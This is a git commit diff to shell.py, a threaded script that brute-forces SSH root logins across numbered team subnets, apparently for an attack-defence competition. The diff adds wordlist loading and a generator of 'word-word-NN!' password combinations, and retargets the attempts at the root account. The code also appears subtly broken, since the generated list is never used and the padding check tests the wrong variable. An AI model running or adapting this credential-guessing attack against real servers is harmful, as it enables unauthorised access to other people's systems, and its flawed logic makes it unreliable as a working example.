b0bbd5f410c12ee6ec4072518d8480d61600447d
Liam Brennan <lfb6ek@virginia.edu>
2021-03-07 13:43:30 -0500

    update

--- shell.py
+++ shell.py
@@ -19,7 +19,23 @@ def ssh(user, host, password, timeout=2):
 
 default_passwords = ["changeme123!"]
 
-users = ["Yuugo.Takagawa"]
+with open("wordlist.txt") as f:
+	default_passwords = f.readlines()
+
+
+all_pass = []
+for i in range(len(default_passwords)):
+	for j in range(len(default_passwords)):
+		for k in range(1, 17):
+			one = capitalize(default_passwords[i])
+			two = capitalize(default_passwords[j])
+			if i < 10:
+				all_pass += [f"{one}-{two}-0{k}!"]
+				all_pass += [f"{two}-{one}-0{k}!"]
+
+			else:
+				all_pass += [f"{one}-{two}-{k}!"]
+				all_pass += [f"{two}-{one}-{k}!"]
 
 
 # each team
@@ -28,9 +44,9 @@ for team in range(1, 17):
 	for server in [1, 2, 3, 4, 5, 6, 11, 12, 13, 20, 21, 22, 42, 69]:
 		# check each default password
 		for password in default_passwords:
-			x = threading.Thread(target=ssh, args=("Yuugo.Takagawa", f"10.{team}.1.{server}", password))
+			x = threading.Thread(target=ssh, args=("root", f"10.{team}.1.{server}", password))
 			x.start()
-			y = threading.Thread(target=ssh, args=("Yuugo.Takagawa", f"172.16.{team}.{server}", password))
+			y = threading.Thread(target=ssh, args=("root", f"172.16.{team}.{server}", password))
 			y.start()
 
 
